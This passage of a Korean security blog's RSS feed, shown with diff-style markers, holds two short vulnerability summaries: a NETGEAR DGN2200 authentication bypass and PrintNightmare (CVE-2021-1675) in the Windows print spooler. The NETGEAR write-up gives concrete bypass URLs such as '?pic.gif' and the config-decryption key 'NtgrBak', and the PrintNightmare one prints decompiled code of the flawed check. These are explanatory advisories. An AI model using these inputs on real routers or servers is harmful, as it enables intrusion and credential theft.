&#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC778;&#xC99D; &#xC6B0;&#xD68C;&#xB97C; &#xD1B5;&#xD55C; &#xB77C;&#xC6B0;&#xD130; &#xAD00;&#xB9AC;&#xC790; &#xD398;&#xC774;&#xC9C0; &#xC811;&#xADFC;</strong></p><p>HTTPd &#xB0B4;&#xBD80; &#xCC98;&#xB9AC; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>strstr</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC804;&#xCCB4; &#xBB38;&#xC790;&#xC5F4;&#xC5D0;&#xC11C; <code>.jpg</code>, <code>.gif</code>, <code>ess_</code> &#xB4F1;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; GET &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xD398;&#xC774;&#xC9C0; &#xB4A4;&#xC5D0; &#xD574;&#xB2F9; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xAC78;&#xB9B0; &#xBB38;&#xC790;&#xB97C; &#xB123;&#xC73C;&#xBA74; &#xC778;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs asciidoc">&#xC608;&#xC2DC;) <span class="hljs-link">http://127</span>[<span class="hljs-string">.</span>]<span class="hljs-link">0[.]0</span>[<span class="hljs-string">.</span>]<span class="hljs-link">1/admin.htm?pic.gif</span></code></pre><p><strong>Cryptographic side-channel&#xC744; &#xD1B5;&#xD574; &#xC800;&#xC7A5;&#xB41C; &#xB77C;&#xC6B0;&#xD130; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xAC00;&#xC838;&#xC624;&#xAE30;</strong></p><p>&#xB77C;&#xC6B0;&#xD130;&#xC5D0;&#xC11C; HTTPd &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC778;&#xC99D;&#xD574;&#xC57C;&#xD558;&#xB294; &#xACBD;&#xC6B0; HTTP basic authentication&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;&#xACFC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB294; base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB418;&#xACE0; HTTP &#xD5E4;&#xB354;&#xB85C; &#xC804;&#xC1A1;&#xB41C; &#xD6C4; &#xB77C;&#xC6B0;&#xD130;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC774;&#xB984;&#xACFC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xC640; &#xBE44;&#xAD50;&#xD574; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB77C;&#xC6B0;&#xD130;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xC678;&#xBD80;&#xC5D0; &#xC788;&#xB294; NVRAM&#xC5D0; &#xC778;&#xC99D; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xBBC0;&#xB85C; &#xC774;&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC778;&#xC99D; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xC774;&#xB984;&#xACFC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; <code>strcmp</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;. <code>strcmp</code>&#xB294; NUL&#xC744; &#xB9CC;&#xB098;&#xAC70;&#xB098; &#xC77C;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC0DD;&#xAE38; &#xB54C;&#xAE4C;&#xC9C0; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xBBC0;&#xB85C; &#xC2E4;&#xD328;&#xD560; &#xB54C;&#xAE4C;&#xC9C0; &#xAC78;&#xB9AC;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xD1B5;&#xD574; side-channel attack&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC800;&#xC7A5;&#xB41C; &#xBBFC;&#xAC10;&#xD55C; &#xC815;&#xBCF4; &#xD0D0;&#xC0C9;</strong></p><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xB4DC;&#xB9B0; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC83; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB77C;&#xC6B0;&#xD130;&#xC758; &#xC124;&#xC815; &#xBC31;&#xC5C5;/&#xBCF5;&#xAD6C; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;, &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>http://router_addr:8080/NETGEAR_DGN2200[.]cfg?pic[.]gif</code>&#xB85C; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC740; DES&#xB85C; &#xC554;&#xD638;&#xD654; &#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBA70;, &#xBC31;&#xC5C5;/&#xBCF5;&#xAD6C; &#xAE30;&#xB2A5;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>NtgrBak</code> &#xD0A4;&#xB97C; &#xD1B5;&#xD574; &#xC554;&#xD638;&#xD654; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; NVRAM&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC554;&#xD638;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/side-channel-attack/">side-channel attack</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/netgear/">netgear</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-1675: Windows Spooler Service 원격 코드 실행 취약점</title>
-      <link>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/</link>
-      <guid>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/</guid>
-      <pubDate>Thu, 01 Jul 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/afwu/PrintNightmare&quot;&gt;PrintNightmare (C</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/afwu/PrintNightmare">PrintNightmare (CVE-2021-1675): Remote code execution in Windows Spooler Service</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PrintNightmare&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; Printer Spooler &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4; &#xBC0F; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD504;&#xB9B0;&#xD130; &#xC11C;&#xBC84;&#xC5D0; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xAC70;&#xB098; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>RpcAddPrinterDriver</code> &#xD568;&#xC218;&#xB294; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xCD94;&#xAC00;&#xD560; &#xB54C; Spooler Service&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">1</span>:<span class="hljs-function">__int64 __fastcall <span class="hljs-title">SplAddPrinterDriverEx</span><span class="hljs-params">(.. <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a4 ..)</span></span>{<span class="hljs-number">2</span>:...<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-keyword">if</span>( !_bittest((<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> *)&amp;a4, <span class="hljs-number">0xF</span>u))<span class="hljs-number">5</span>:v11 = a7;<span class="hljs-number">6</span>:<span class="hljs-keyword">if</span>(v11 &amp;&amp; !(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)ValidateObjectAccess(<span class="hljs-number">0</span>i64, <span class="hljs-number">1</span>i64, <span class="hljs-number">0</span>i64)<span class="hljs-number">7</span>:<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<span class="hljs-number">8</span>:<span class="hljs-keyword">return</span> InternalAddPrinterDriverEx(lpString1, a2, a3, a4, (struct _INISPOOLER *)a5, a6, v11, <span class="hljs-number">0</span>i64);<span class="hljs-number">9</span>:<span class="hljs-number">10</span>:}</code></pre><p>line 4&#xC640; 5&#xC5D0;&#xC11C; <code>a4</code>&#xB294; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC758; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xC545;&#xC131; DLL&#xC744; &#xD0C0;&#xAC9F; &#xC11C;&#xBC84;&#xC5D0; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC815;&#xBCF4; &#xAD6C;&#xC870;&#xCCB4;&#xC758; <code>pConfigFile</code>&#xC774; UNC &#xACBD;&#xB85C;&#xAC00; &#xD5C8;&#xC6A9;&#xB41C;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xD0C0;&#xAC9F; &#xC11C;&#xBC84;&#xC5D0; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC5C5;&#xADF8;&#xB808;&#xC774;&#xB4DC;&#xC758; &#xBC31;&#xC5C5; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xC561;&#xC138;&#xC2A4; &#xCDA9;&#xB3CC;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xB85C;&#xB4DC;&#xB41C; &#xC545;&#xC131; dll&#xC744; spooler service&#xC5D0; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>UNC(Universal Naming Convention) : &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC0C1;&#xC758; &#xACF5;&#xC720; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xD3EC;&#xB9F7; ex) \servername\sharename\path\filename</p></blockquote><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; Microsoft&#xB294; 2021&#xB144; 6&#xC6D4; 8&#xC77C; Patch Tuesday &#xB9B4;&#xB9AC;&#xC988;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xD588;&#xC9C0;&#xB9CC; &#xD328;&#xCE58;&#xAC00; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD574;&#xACB0;&#xD558;&#xC9C0; &#xBABB;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0">https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/printer-spooler/">printer spooler</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/printnightmare/">printnightmare</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/#disqus_thread</comments>
       
     </item>
     
